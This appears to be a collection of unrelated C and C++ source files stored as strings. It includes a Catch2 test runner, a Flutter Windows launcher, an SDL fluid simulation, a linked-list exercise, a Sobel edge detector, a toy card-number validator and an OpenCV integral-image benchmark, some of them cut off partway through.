    "// sol2\n\n// The MIT License (MIT)\n\n// Copyright (c) 2013-2022 Rapptz, ThePhD and contributors\n\n// Permission is hereby granted, free of charge, to any person obtaining a copy of\n// this software and associated documentation files (the \"Software\"), to deal in\n// the Software without restriction, including without limitation the rights to\n// use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of\n// the Software, and to permit persons to whom the Software is furnished to do so,\n// subject to the following conditions:\n\n// The above copyright notice and this permission notice shall be included in all\n// copies or substantial portions of the Software.\n\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS\n// FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR\n// COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER\n// IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n// CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\n#define CATCH_CONFIG_RUNNER\n#include <catch2/catch_all.hpp>\n\nint main(int argc, char* argv[]) {\n\tint result = Catch::Session().run(argc, argv);\n\treturn result;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dribbble_design\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\r\n#include <SDL.h>\r\n#include <vector>\r\n#include <cmath>\r\n#include <iostream>\r\n#include <random>\r\n#include <string>\r\n#include <algorithm>\r\n\r\n// \u00cd\u00e0\u00f1\u00f2\u00f0\u00ee\u00e9\u00ea\u00e8\r\nconst int WIDTH = 600;\r\nconst int HEIGHT = 720;\r\nconst int FPS = 6000;\r\nconst float PARTICLE_RADIUS = 10.0f;\r\nconst float GRAVITY = 0.0981f;\r\nconst float REST_DENSITY = 0.01f;\r\nconst float GAS_CONSTANT = 0.95f;\r\nconst float VISCOSITY = 0.9f;\r\nconst int PARTICLE_CREATION_RATE = 10;\r\nconst float COHESION_STRENGTH = 0.0f;\r\nconst float DAMPING = 0.99f;\r\nconst float DRAG_COEFFICIENT = 0.1f;\r\nconst int GRAB_RADIUS = 100;\r\nconst float SPRING_CONSTANT = 0.25f;\r\nconst int MAX_PARTICLES = 150000; // \u00ce\u00e3\u00f0\u00e0\u00ed\u00e8\u00f7\u00e5\u00ed\u00e8\u00e5 \u00ed\u00e0 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f7\u00e0\u00f1\u00f2\u00e8\u00f6\r\n\r\n// \u00cf\u00f0\u00e5\u00ef\u00ff\u00f2\u00f1\u00f2\u00e2\u00e8\u00e5 (\u00f2\u00e5\u00ef\u00e5\u00f0\u00fc \u00f1\u00f4\u00e5\u00f0\u00e0)\r\nconst float OBSTACLE_X = 400.0f;\r\nconst float OBSTACLE_Y = 300.0f;\r\nconst float OBSTACLE_Z = 200.0f;\r\nconst float OBSTACLE_RADIUS = 100.0f;\r\n\r\n// \u00d1\u00f2\u00e5\u00ed\u00fb (\u00f2\u00e5\u00ef\u00e5\u00f0\u00fc \u00ee\u00e3\u00f0\u00e0\u00ed\u00e8\u00f7\u00e8\u00e2\u00e0\u00fe\u00f9\u00e8\u00e9 \u00ea\u00f3\u00e1)\r\nconst float WALL_THICKNESS = 0.0f;\r\nconst SDL_Color WALL_COLOR = { 255, 255, 255, 255 };\r\nconst float PAD_X = 20.0f;\r\nconst float PAD_Y = 20.0f;\r\nconst float PAD_Z = 20.0f;\r\n\r\n// \u00c3\u00f0\u00e0\u00e4\u00e8\u00e5\u00ed\u00f2 \u00f6\u00e2\u00e5\u00f2\u00ee\u00e2\r\nconst int GRADIENT_STEPS = 256;\r\nSDL_Color color_gradient[GRADIENT_STEPS];\r\nconst float max_speed = 25.0f;\r\n\r\n// \u00d3\u00e3\u00eb\u00fb \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb\r\nfloat cameraYaw = 0.0f; // \u00cf\u00ee\u00e2\u00ee\u00f0\u00ee\u00f2 \u00e2\u00ee\u00ea\u00f0\u00f3\u00e3 \u00ee\u00f1\u00e8 Y\r\nfloat cameraPitch = 0.0f; // \u00cd\u00e0\u00ea\u00eb\u00ee\u00ed \u00e2\u00e2\u00e5\u00f0\u00f5/\u00e2\u00ed\u00e8\u00e7\r\n\r\n// \u00cf\u00ee\u00e7\u00e8\u00f6\u00e8\u00ff \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb\r\nfloat cameraX = 0.0f;\r\nfloat cameraY = 0.0f;\r\nfloat cameraZ = 0.0f;\r\n\r\n// \u00d4\u00f3\u00ed\u00ea\u00f6\u00e8\u00ff \u00e4\u00eb\u00ff \u00f1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00ff \u00e3\u00f0\u00e0\u00e4\u00e8\u00e5\u00ed\u00f2\u00e0 \u00f6\u00e2\u00e5\u00f2\u00ee\u00e2 (\u00ed\u00e5 \u00e8\u00e7\u00ec\u00e5\u00ed\u00e8\u00eb\u00e0\u00f1\u00fc)\r\nvoid create_gradient(SDL_Color color1, SDL_Color color2, int steps, SDL_Color* gradient) {\r\n    for (int i = 0; i < steps; ++i) {\r\n        float t = i / (steps - 1.0f);\r\n        gradient[i].r = static_cast<Uint8>(color1.r * (1 - t) + color2.r * t);\r\n        gradient[i].g = static_cast<Uint8>(color1.g * (1 - t) + color2.g * t);\r\n        gradient[i].b = static_cast<Uint8>(color1.b * (1 - t) + color2.b * t);\r\n        gradient[i].a = 255;\r\n    }\r\n}\r\n\r\n// \u00d4\u00f3\u00ed\u00ea\u00f6\u00e8\u00ff \u00e4\u00eb\u00ff \u00f0\u00e8\u00f1\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff \u00e7\u00e0\u00ef\u00ee\u00eb\u00ed\u00e5\u00ed\u00ed\u00ee\u00e3\u00ee \u00ea\u00f0\u00f3\u00e3\u00e0 (\u00f2\u00e5\u00ef\u00e5\u00f0\u00fc \u00f0\u00e8\u00f1\u00f3\u00e5\u00f2 \u00f1 \u00f3\u00f7\u00e5\u00f2\u00ee\u00ec \u00ef\u00e5\u00f0\u00f1\u00ef\u00e5\u00ea\u00f2\u00e8\u00e2\u00fb, \u00f3\u00e3\u00eb\u00ee\u00e2 \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb \u00e8 \u00ef\u00ee\u00e7\u00e8\u00f6\u00e8\u00e8 \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb)\r\nvoid filledCircleRGBA(SDL_Renderer* renderer, float x, float y, float z, float radius, Uint8 r, Uint8 g, Uint8 b, Uint8 a) {\r\n    // \u00cf\u00f0\u00e8\u00ec\u00e5\u00ed\u00e5\u00ed\u00e8\u00e5 \u00ef\u00ee\u00e7\u00e8\u00f6\u00e8\u00e8 \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb\r\n    x -= cameraX;\r\n    y -= cameraY;\r\n    z -= cameraZ;\r\n\r\n    // \u00cf\u00ee\u00e2\u00ee\u00f0\u00ee\u00f2 \u00e2\u00ee\u00ea\u00f0\u00f3\u00e3 \u00ee\u00f1\u00e8 Y (Yaw)\r\n    float rotatedX = x * cos(cameraYaw) - z * sin(cameraYaw);\r\n    float rotatedZ = x * sin(cameraYaw) + z * cos(cameraYaw);\r\n\r\n    // \u00cd\u00e0\u00ea\u00eb\u00ee\u00ed \u00e2\u00e2\u00e5\u00f0\u00f5/\u00e2\u00ed\u00e8\u00e7 (Pitch) - \u00ed\u00e5 \u00f0\u00e5\u00e0\u00eb\u00e8\u00e7\u00ee\u00e2\u00e0\u00ed, \u00f2\u00f0\u00e5\u00e1\u00f3\u00e5\u00f2 \u00e1\u00ee\u00eb\u00e5\u00e5 \u00f1\u00eb\u00ee\u00e6\u00ed\u00ee\u00e9 \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00fb \u00ef\u00ee\u00e2\u00ee\u00f0\u00ee\u00f2\u00e0\r\n\r\n    // \u00cf\u00f0\u00ee\u00f1\u00f2\u00e0\u00ff \u00ef\u00f0\u00ee\u00e5\u00ea\u00f6\u00e8\u00ff \u00ef\u00e5\u00f0\u00f1\u00ef\u00e5\u00ea\u00f2\u00e8\u00e2\u00fb (\u00ec\u00ee\u00e6\u00ed\u00ee \u00f3\u00eb\u00f3\u00f7\u00f8\u00e8\u00f2\u00fc)\r\n    float perspectiveScale = 1.0f / (1.0f + rotatedZ / 500.0f);\r\n    int screenX = static_cast<int>(rotatedX * perspectiveScale + WIDTH / 2);\r\n    int screenY = static_cast<int>(y * perspectiveScale + HEIGHT / 2);\r\n    int screenRadius = static_cast<int>(radius * perspectiveScale);\r\n\r\n    for (int dy = -screenRadius; dy <= screenRadius; ++dy) {\r\n        for (int dx = -screenRadius; dx <= screenRadius; ++dx) {\r\n            if (dx * dx + dy * dy <= screenRadius * screenRadius) {\r\n                SDL_SetRenderDrawColor(renderer, r, g, b, a);\r\n                SDL_RenderDrawPoint(renderer, screenX + dx, screenY + dy);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n// \u00ca\u00eb\u00e0\u00f1\u00f1 \u00f7\u00e0\u00f1\u00f2\u00e8\u00f6\u00fb (\u00e4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed z)\r\nclass Particle {\r\npublic:\r\n    float x;\r\n    float y;\r\n    float z; // \u00cd\u00ee\u00e2\u00e0\u00ff \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00e0\r\n    float vx;\r\n    float vy;\r\n    float vz; // \u00cd\u00ee\u00e2\u00e0\u00ff \u00f1\u00ea\u00ee\u00f0\u00ee\u00f1\u00f2\u00fc\r\n    float density;\r\n    float pressure;\r\n    std::vector<Particle*> near_particles;\r\n    bool grabbed;\r\n\r\n    Particle(float x, float y, float z) : x(x), y(y), z(z), vx(0), vy(0), vz(0), density(0), pressure(0), grabbed(false) {}\r\n\r\n    void update() {\r\n        vy += GRAVITY;\r\n        x += vx;\r\n        y += vy;\r\n        z += vz; // \u00ce\u00e1\u00ed\u00ee\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 z\r\n\r\n        // \u00d1\u00f2\u00ee\u00eb\u00ea\u00ed\u00ee\u00e2\u00e5\u00ed\u00e8\u00ff \u00f1 \u00e3\u00f0\u00e0\u00ed\u00e8\u00f6\u00e0\u00ec\u00e8 (\u00ea\u00f3\u00e1)\r\n        if (x < PARTICLE_RADIUS + PAD_X) {\r\n            x = PARTICLE_RADIUS + PAD_X;\r\n            vx *= -0.7f;\r\n        }\r\n        else if (x > WIDTH - PARTICLE_RADIUS - PAD_X) {\r\n            x = WIDTH - PARTICLE_RADIUS - PAD_X;\r\n            vx *= -0.7f;\r\n        }\r\n\r\n        if (y > HEIGHT - PARTICLE_RADIUS - PAD_Y) {\r\n            y = HEIGHT - PARTICLE_RADIUS - PAD_Y;\r\n            vy *= -0.7f;\r\n        }\r\n        // \u00c4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed\u00fb \u00ee\u00e3\u00f0\u00e0\u00ed\u00e8\u00f7\u00e5\u00ed\u00e8\u00ff \u00ef\u00ee z\r\n        if (z < PARTICLE_RADIUS + PAD_Z) {\r\n            z = PARTICLE_RADIUS + PAD_Z;\r\n            vz *= -0.7f;\r\n        }\r\n        else if (z > 400 - PARTICLE_RADIUS - PAD_Z) { // \u00cf\u00f0\u00e5\u00e4\u00ef\u00ee\u00eb\u00e0\u00e3\u00e0\u00e5\u00ec\u00e0\u00ff \u00ec\u00e0\u00ea\u00f1\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00e0\u00ff \u00e3\u00eb\u00f3\u00e1\u00e8\u00ed\u00e0\r\n            z = 400 - PARTICLE_RADIUS - PAD_Z;\r\n            vz *= -0.7f;\r\n        }\r\n\r\n\r\n        // \u00d1\u00f2\u00ee\u00eb\u00ea\u00ed\u00ee\u00e2\u00e5\u00ed\u00e8\u00e5 \u00f1 \u00ef\u00f0\u00e5\u00ef\u00ff\u00f2\u00f1\u00f2\u00e2\u00e8\u00e5\u00ec (\u00f1\u00f4\u00e5\u00f0\u00e0)\r\n        float dx = x - OBSTACLE_X;\r\n        float dy = y - OBSTACLE_Y;\r\n        float dz = z - OBSTACLE_Z;\r\n        float distance_to_obstacle_sq = dx * dx + dy * dy + dz * dz; // 3D \u00f0\u00e0\u00f1\u00f1\u00f2\u00ee\u00ff\u00ed\u00e8\u00e5\r\n        float radius_sum_sq = (PARTICLE_RADIUS + OBSTACLE_RADIUS) * (PARTICLE_RADIUS + OBSTACLE_RADIUS);\r\n\r\n        if (distance_to_obstacle_sq < radius_sum_sq) {\r\n            float distance_to_obstacle = st",
    "#include <iostream>\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nusing namespace std;\n\ntypedef struct Node\n{\n    Node *prev;\n    int data;\n    Node *next;\n} Node;\n\nvoid display(Node *head)\n{\n    Node *p = head;\n    printf(\"\\nList: \");\n    if (head == NULL)\n    {\n        printf(\"NULL\\n\");\n    }\n    else\n    {\n        do\n        {\n            printf(\"%d -> \", p->data);\n            p = p->next;\n        } while (p != head);\n        printf(\"\\n\");\n    }\n}\n\n// Note: to modify the list, use Node **head i.e address of the head itself,\n//  deref will give the address of first node\n// using the address of first node, we can access the member vars to first node\n\nvoid create(Node **head, Node **tail, int n)\n{\n    srand(time(NULL));\n\n    if (n == 0)\n    {\n        *head = NULL;\n        return;\n    }\n\n    for (int i = 0; i < n; i++)\n    {\n        Node *t = (Node *)malloc(sizeof(Node));\n        t->data = (int)rand() % 10;\n\n        // base case :  empty list\n        if (*head == NULL)\n        {\n            *head = *tail = t;\n            t->next = *head;\n        }\n        else\n        {\n            // link t to head and vice versa\n            t->next = *head;\n            (*head)->prev = t;\n\n            // link tail to t and vice versa\n            (*tail)->next = t;\n            t->prev = *tail;\n\n            // point tail to new last node\n            *tail = t;\n        }\n    }\n}\n\nvoid insert_begin(Node **head, int x)\n{\n    Node *t = (Node *)malloc(sizeof(Node));\n    t->data = x;\n    t->prev = t->next = NULL;\n\n    if (head == NULL)\n    {\n        *head = t;\n        t->next = *head;\n        t->prev = *head;\n    }\n    else\n    {\n        t->next = *head;\n        t->prev = (*head)->prev; // point to last node\n\n        (*head)->prev->next = t;\n        (*head)->prev = t;\n\n        // point head to new node\n        *head = t;\n    }\n}\n\nvoid insert_end(Node **head, int x)\n{\n    Node *t = (Node *)malloc(sizeof(Node));\n    t->data = x;\n    t->prev = t->next = NULL;\n\n    if (head == NULL)\n    {\n        *head = t;\n        t->next = *head;\n        t->prev = *head;\n    }\n    else\n    {\n        t->next = *head;\n        t->prev = (*head)->prev; // point to last node\n\n        (*head)->prev->next = t;\n        (*head)->prev = t;\n    }\n}\n\nvoid Delete(Node **head, Node *p)\n{\n    if (*head == NULL) // empty list\n    {\n        printf(\"You cannot delete empty list\");\n        return;\n    }\n    else\n    {\n        if (p->next == p) // 1 node in list\n        {\n            *head = NULL;\n            printf(\"%d is deleted\\n\", p->data);\n            free(p);\n            return;\n        }\n\n        // deleting the second node\n        if (p->next == *head)\n        {\n            p->next->next->prev = p;\n            Node *q = *head;\n            *head = (*head)->next;\n            p->next = *head;\n\n            printf(\"%d is deleted\", q->data);\n            free(q);\n            return;\n        }\n        else\n        {\n            Node *q = p->next;\n            q->next->prev = p;\n            p->next = q->next;\n            printf(\"%d is deleted\", q->data);\n            free(q);\n            return;\n        }\n    }\n}\n\nint main(int argc, char **argv)\n{\n    int n, value;\n    Node *head = NULL;\n    Node *tail = NULL;\n\n    printf(\"Enter no of nodes: \");\n    scanf(\"%d\", &n);\n    create(&head, &tail, n);\n    display(head);\n\n    // insert at beginning\n    // printf(\"Enter value to insert at begining: \");\n    // scanf(\"%d\", &value);\n    // insert_begin(&head, value);\n    // display(head);\n\n    // insert at end\n    // printf(\"Enter value to insert at begining: \");\n    // scanf(\"%d\", &value);\n    // insert_end(&head, value);\n    // display(head);\n\n    // delete at p node\n    Node *temp = (head)->next->next;\n    Delete(&head, temp);\n    display(head);\n\n    return 0;\n}",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <stdint.h>\r\n#include <string.h>\r\n#include <time.h>\r\n#include <jpeglib.h>\r\n\r\n#define IMAGE_WIDTH 30000\r\n#define IMAGE_HEIGHT 22943\r\n#define RGB_CHANNELS 3\r\n\r\ntypedef struct {\r\n    uint8_t red;\r\n    uint8_t green;\r\n    uint8_t blue;\r\n} RGBPixel;\r\n\r\ntypedef struct {\r\n    uint8_t gray;\r\n} GrayPixel;\r\n\r\nRGBPixel img[IMAGE_HEIGHT][IMAGE_WIDTH];\r\nGrayPixel grayscale[IMAGE_HEIGHT][IMAGE_WIDTH];\r\nGrayPixel edges[IMAGE_HEIGHT][IMAGE_WIDTH];\r\n\r\nvoid grayscaleConversion() {\r\n    int x, y;\r\n    for (y = 0; y < IMAGE_HEIGHT; y++) {\r\n        for (x = 0; x < IMAGE_WIDTH; x++) {\r\n            grayscale[y][x].gray = (uint8_t)((0.3 * img[y][x].red) +\r\n                                              (0.59 * img[y][x].green) +\r\n                                              (0.11 * img[y][x].blue));\r\n        }\r\n    }\r\n}\r\n\r\nvoid sobelEdgeDetection() {\r\n    int gradient_x, gradient_y, x, y;\r\n    int Gx[3][3] = {{-1, 0, 1},\r\n                    {-2, 0, 2},\r\n                    {-1, 0, 1}};\r\n    int Gy[3][3] = {{-1, -2, -1},\r\n                    { 0,  0,  0},\r\n                    { 1,  2,  1}};\r\n\r\n    for (y = 1; y < IMAGE_HEIGHT - 1; y++) {\r\n        for (x = 1; x < IMAGE_WIDTH - 1; x++) {\r\n            gradient_x = (Gx[0][0] * grayscale[y - 1][x - 1].gray) + (Gx[0][1] * grayscale[y - 1][x].gray) + (Gx[0][2] * grayscale[y - 1][x + 1].gray) +\r\n                         (Gx[1][0] * grayscale[y][x - 1].gray) + (Gx[1][1] * grayscale[y][x].gray) + (Gx[1][2] * grayscale[y][x + 1].gray) +\r\n                         (Gx[2][0] * grayscale[y + 1][x - 1].gray) + (Gx[2][1] * grayscale[y + 1][x].gray) + (Gx[2][2] * grayscale[y + 1][x + 1].gray);\r\n\r\n            gradient_y = (Gy[0][0] * grayscale[y - 1][x - 1].gray) + (Gy[0][1] * grayscale[y - 1][x].gray) + (Gy[0][2] * grayscale[y - 1][x + 1].gray) +\r\n                         (Gy[1][0] * grayscale[y][x - 1].gray) + (Gy[1][1] * grayscale[y][x].gray) + (Gy[1][2] * grayscale[y][x + 1].gray) +\r\n                         (Gy[2][0] * grayscale[y + 1][x - 1].gray) + (Gy[2][1] * grayscale[y + 1][x].gray) + (Gy[2][2] * grayscale[y + 1][x + 1].gray);\r\n\r\n            int gradient = abs(gradient_x) + abs(gradient_y);\r\n            edges[y][x].gray = (uint8_t)(gradient > 128 ? 255 : gradient);\r\n        }\r\n    }\r\n}\r\n\r\nvoid loadJPEGImage(const char *filename) {\r\n    struct jpeg_decompress_struct cinfo;\r\n    struct jpeg_error_mgr jerr;\r\n    JSAMPARRAY buffer;\r\n    int row_stride;\r\n\r\n    FILE *infile = fopen(filename, \"rb\");\r\n    if (!infile) {\r\n        fprintf(stderr, \"Error: Unable to open file %s for reading.\\n\", filename);\r\n        exit(EXIT_FAILURE);\r\n    }\r\n\r\n    cinfo.err = jpeg_std_error(&jerr);\r\n    jpeg_create_decompress(&cinfo);\r\n    jpeg_stdio_src(&cinfo, infile);\r\n    jpeg_read_header(&cinfo, TRUE);\r\n    jpeg_start_decompress(&cinfo);\r\n\r\n    row_stride = cinfo.output_width * cinfo.output_components;\r\n    buffer = (*cinfo.mem->alloc_sarray)((j_common_ptr)&cinfo, JPOOL_IMAGE, row_stride, 1);\r\n\r\n    int x;\r\n    while (cinfo.output_scanline < cinfo.output_height) {\r\n        int y = cinfo.output_scanline;\r\n        jpeg_read_scanlines(&cinfo, buffer, 1);\r\n        for (x = 0; x < IMAGE_WIDTH; x++) {\r\n            img[y][x].red = buffer[0][x * 3];\r\n            img[y][x].green = buffer[0][x * 3 + 1];\r\n            img[y][x].blue = buffer[0][x * 3 + 2];\r\n        }\r\n    }\r\n\r\n    jpeg_finish_decompress(&cinfo);\r\n    jpeg_destroy_decompress(&cinfo);\r\n    fclose(infile);\r\n}\r\n\r\nvoid saveJPEGImage(const char *filename, GrayPixel image[IMAGE_HEIGHT][IMAGE_WIDTH]) {\r\n    struct jpeg_compress_struct cinfo;\r\n    struct jpeg_error_mgr jerr;\r\n    FILE *outfile;\r\n    JSAMPROW row_pointer[1];\r\n    int row_stride;\r\n\r\n    cinfo.err = jpeg_std_error(&jerr);\r\n    jpeg_create_compress(&cinfo);\r\n\r\n    if ((outfile = fopen(filename, \"wb\")) == NULL) {\r\n        fprintf(stderr, \"Error: Unable to open file %s for writing.\\n\", filename);\r\n        exit(EXIT_FAILURE);\r\n    }\r\n    jpeg_stdio_dest(&cinfo, outfile);\r\n\r\n    cinfo.image_width = IMAGE_WIDTH;\r\n    cinfo.image_height = IMAGE_HEIGHT;\r\n    cinfo.input_components = 1;\r\n    cinfo.in_color_space = JCS_GRAYSCALE;\r\n\r\n    jpeg_set_defaults(&cinfo);\r\n    jpeg_set_quality(&cinfo, 100, TRUE);\r\n\r\n    jpeg_start_compress(&cinfo, TRUE);\r\n\r\n    row_stride = IMAGE_WIDTH * 1;\r\n    while (cinfo.next_scanline < cinfo.image_height) {\r\n        row_pointer[0] = &image[cinfo.next_scanline][0].gray;\r\n        jpeg_write_scanlines(&cinfo, row_pointer, 1);\r\n    }\r\n\r\n    jpeg_finish_compress(&cinfo);\r\n    fclose(outfile);\r\n    jpeg_destroy_compress(&cinfo);\r\n}\r\n\r\nint main() {\r\n    clock_t start, end;\r\n    double cpu_time_used;\r\n\r\n    loadJPEGImage(\"Large_image.jpg\");\r\n    start = clock();\r\n\r\n    grayscaleConversion();\r\n\r\n    \r\n\r\n    sobelEdgeDetection();\r\n\r\n    saveJPEGImage(\"Large_image_edge.jpg\", edges);\r\n\r\n    end = clock();\r\n    cpu_time_used = ((double)(end - start)) / CLOCKS_PER_SEC;\r\n    printf(\"Time taken for edge detection: %f seconds\\n\", cpu_time_used);\r\n\r\n  ",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <algorithm>\nusing namespace std;\n\nbool validate_credit_card(const string& credit_card) {\n    \n    for (size_t i = 0; i < credit_card.length(); ++i) {\n        if (!isdigit(credit_card[i])) {\n            return false;\n        }\n    }\n    return true;\n}\n\nbool validate_credit_card_number(const string& credit_card, const vector<string>& valid_credit_cards) {\n    return find(valid_credit_cards.begin(), valid_credit_cards.end(), credit_card) != valid_credit_cards.end();\n}\n\nstring enter_credit_card() {\n    string credit_card;\n    do {\n        cout << \"Enter 10-digit credit_card_number:\\n \";\n        cin >> credit_card;\n        if (credit_card.length() != 10 || !validate_credit_card(credit_card)) {\n            cout << \"SORRY Please enter 10-digit credit_card_number.\" << endl;\n        }\n    } while (credit_card.length() != 10 || !validate_credit_card(credit_card));\n    return credit_card;\n}\n\nint main() {\n    const int num_credit_cards = 20;\n    vector<string> valid_credit_cards;\n    valid_credit_cards.push_back(\"2001200111\");\n    valid_credit_cards.push_back(\"2002200222\");\n    valid_credit_cards.push_back(\"2003200333\");\n    valid_credit_cards.push_back(\"2004200444\");\n    valid_credit_cards.push_back(\"2005200555\");\n    valid_credit_cards.push_back(\"2006200666\");\n    valid_credit_cards.push_back(\"2007200777\");\n    valid_credit_cards.push_back(\"2008200888\");\n    valid_credit_cards.push_back(\"2009200999\");\n    valid_credit_cards.push_back(\"2010201010\");\n    valid_credit_cards.push_back(\"2011201111\");\n    valid_credit_cards.push_back(\"2012201212\");\n    valid_credit_cards.push_back(\"2013201313\");\n    valid_credit_cards.push_back(\"2014201414\");\n    valid_credit_cards.push_back(\"2015201515\");\n    valid_credit_cards.push_back(\"2016201616\");\n    valid_credit_cards.push_back(\"2017201717\");\n    valid_credit_cards.push_back(\"2018201818\");\n    valid_credit_cards.push_back(\"2019201919\");\n    valid_credit_cards.push_back(\"2020202020\");\n\n    int option;\n\n    while (true) {\n        cout << \"----------INFORMATION IN CREDIT_CARD_NUMBERS----------\" << endl;\n        cout << \"          1: Enter a credit_card_number\" << endl;\n        cout << \"          2: Continue enter another credit_card_number\" << endl;\n        cout << \"          3: Exit\" << endl;\n\n        cout << \"Enter your choice (1 & 2 & 3): \\n\";\n        cin >> option;\n\n        switch (option) {\n            case 1:\n                {\n                    string credit_card = enter_credit_card();\n                    if (validate_credit_card_number(credit_card, valid_credit_cards)) {\n                        cout << \"Valid_credit_card_number!\" << endl;\n                    } else {\n                        cout << \"Invalid credit_card_number!\" << endl;\n                    }\n                }\n                break;\n            case 2:\n                {\n                    string credit_card = enter_credit_card();\n                    if (validate_credit_card_number(credit_card, valid_credit_cards)) {\n                        cout << \"Valid credit card number!\" << endl;\n                    } else {\n                        cout << \"Invalid credit card number!\" << endl;\n                    }\n                }\n                break;\n            case 3:\n                cout << \"Exits the program.\" << endl;\n                return 0;\n            default:\n                cout << \"SORRY Invalid option.\" << endl;\n                cout<<\"Please select a valid option (1 & 2 & 3).\\n\";\n        }\n    }\n\n    return 0;\n}\n\n",
    "#define BACKWARD_HAS_DW 1\n#include \"code_utils/backward.hpp\"\nnamespace backward\n{\nbackward::SignalHandling sh;\n}\n\n#include <code_utils/sys_utils/tic_toc.h>\n#include <iostream>\n#include <opencv2/opencv.hpp>\n#include <time.h>\n\nusing namespace std;\nusing namespace cv;\n\ndouble t;\n\nvoid\nshowImg( std::string name, cv::Mat img )\n{\n    cv::namedWindow( name, WINDOW_NORMAL );\n    cv::imshow( name, img );\n}\n\nvoid\nsumPixelRow( const cv::Mat& img, cv::Mat& integral )\n{\n    if ( img.type( ) == CV_8UC1 )\n        integral = cv::Mat( img.rows, img.cols, CV_32SC1 );\n\n    int nr = img.rows, nc = img.cols;\n    int index_col, index_row;\n\n    const uchar* pImg = img.ptr< uchar >( 0 );\n    int* pIntegral    = integral.ptr< int >( 0 );\n\n    for ( index_row = 0; index_row < nr; ++index_row )\n    {\n        pImg      = img.ptr< uchar >( index_row );\n        pIntegral = integral.ptr< int >( index_row );\n\n        pIntegral[0] = pImg[0];\n\n        for ( index_col = 1; index_col < nc; ++index_col )\n        {\n            pIntegral[index_col] = pIntegral[index_col - 1] + pImg[index_col];\n        }\n    }\n}\n\nvoid\nsumPixelRow2( const cv::Mat& img, cv::Mat& integral )\n{\n    if ( img.type( ) == CV_8UC1 )\n        integral = cv::Mat( img.rows, img.cols, CV_32SC1 );\n\n    int nr = img.rows, nc = img.cols;\n    int index_col, index_row;\n\n    const uchar* pImg = img.ptr< uchar >( 0 );\n    int* pIntegral    = integral.ptr< int >( 0 );\n\n    pIntegral[0] = pImg[0];\n    for ( index_col = 1; index_col < nc; ++index_col )\n    {\n        pIntegral[index_col] = pIntegral[index_col - 1] + pImg[index_col];\n    }\n\n    for ( index_row = 1; index_row < nr; ++index_row )\n    {\n        pImg      = img.ptr< uchar >( index_row );\n        pIntegral = integral.ptr< int >( index_row );\n        for ( index_col = 0; index_col < nc; ++index_col )\n        {\n            pIntegral[index_col] = pIntegral[index_col - 1] + pImg[index_col];\n        }\n    }\n}\n\nvoid\ntest1( )\n{\n    Mat img;\n    Mat img1 = imread( \"/home/gao/IMG_1.png\", cv::IMREAD_GRAYSCALE);\n\n    sys_utils::tic::TicTocPart time;\n\n    for ( int i = 0; i < 100; i++ )\n        sumPixelRow( img1, img );\n\n    std::cout << \"sumPixelRow cost \" << time.toc( ) << \" ms\\n\";\n\n    cv::Mat img2;\n    normalize( img, img2, 0, 255, cv::NORM_MINMAX);\n    Mat imageIntegralNorm;\n    convertScaleAbs( img2, imageIntegralNorm );\n\n    showImg( \"src1\", img1 );\n    showImg( \"dst1\", img );\n    showImg( \"dst11\", imageIntegralNorm );\n}\n\nvoid\ntest2( )\n{\n    Mat img;\n    Mat img1 = imread( \"/home/gao/IMG_1.png\", cv::IMREAD_GRAYSCALE );\n\n    sys_utils::tic::TicTocPart time;\n\n    for ( int i = 0; i < 100; i++ )\n        integral( img1, img, img1.type( ) );\n\n    std::cout << \"sumPixelRow cost \" << time.toc( ) << \" ms\\n\";\n\n    cv::Mat img2;\n    normalize( img, img2, 0, 255, cv::NORM_MINMAX);\n    Mat imageIntegralNorm;\n    convertScaleAbs( img2, imageIntegralNorm );\n\n    showImg( \"src2\", img1 );\n    showImg( 